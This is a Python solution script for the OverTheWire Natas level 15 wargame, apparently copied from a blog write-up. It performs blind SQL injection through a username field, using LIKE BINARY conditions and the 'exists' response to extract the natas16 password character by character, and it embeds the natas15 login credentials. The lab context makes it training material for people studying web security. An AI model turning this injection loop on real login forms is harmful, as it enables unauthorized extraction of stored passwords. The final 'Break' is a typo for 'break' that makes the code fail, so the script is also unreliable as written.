# script by https://www.abatchy.com/2016/11/natas-level-14-and-15
import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in chars:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'), data = Data)
    if 'exists' in r.text :
        filtered = filtered + char

for i in range(0,32):
    for char in filtered:
        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'), data = Data)
        if 'exists' in r.text :
            passwd = passwd + char
            print(passwd)
            Break
